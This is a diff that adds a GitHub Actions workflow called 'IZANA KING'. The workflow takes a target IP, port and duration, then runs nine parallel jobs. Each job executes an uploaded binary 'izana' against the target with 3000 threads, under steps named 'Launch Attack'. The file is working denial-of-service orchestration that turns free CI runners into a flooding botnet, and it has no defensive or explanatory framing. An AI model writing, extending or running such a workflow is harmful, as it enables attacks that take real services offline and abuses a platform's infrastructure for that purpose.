@@ -1,0 +1,59 @@
+name: 🗿 IZANA KING
+on: 
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: '🎯 Target IP Address'
+        required: true
+        type: string
+      target_port: 
+        description: '🔌 Target Port'
+        required: true
+        type: string
+      attack_duration:
+        description: '⏰ Attack Duration (seconds)'
+        required: true
+        type: string
+
+permissions:
+  contents: read
+
+jobs:
+  fire:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9]
+    steps:
+      - name: 🗿 Checkout Repository
+        uses: actions/checkout@v4
+        
+      - name: 🔥 Verify Binary
+        run: |
+          if [ ! -f "izana" ]; then
+            echo "❌ ERROR: Binary 'izana' not found!"
+            echo "💡 Use /addbinary command to upload binary first"
+            exit 1
+          fi
+          
+          chmod +x izana
+          
+          if ! file izana | grep -q "executable"; then
+            echo "⚠️ WARNING: File may not be executable binary"
+          fi
+          
+          echo "✅ Binary verified: $(file izana)"
+          echo "📊 Size: $(du -h izana | cut -f1)"
+          
+      - name: 💥 Launch Attack
+        timeout-minutes: 5
+        continue-on-error: true
+        run: |
+          echo "🎯 Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
+          echo "⏰ Duration: ${{ inputs.attack_duration }} seconds"
+          echo "🔢 Instance: ${{ matrix.instance }}"
+          echo "🔥 Executing attack..."
+          
+          ./izana "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.attack_duration }}" 3000
+          
+          echo "✅ Attack completed on instance ${{ matrix.instance }}"
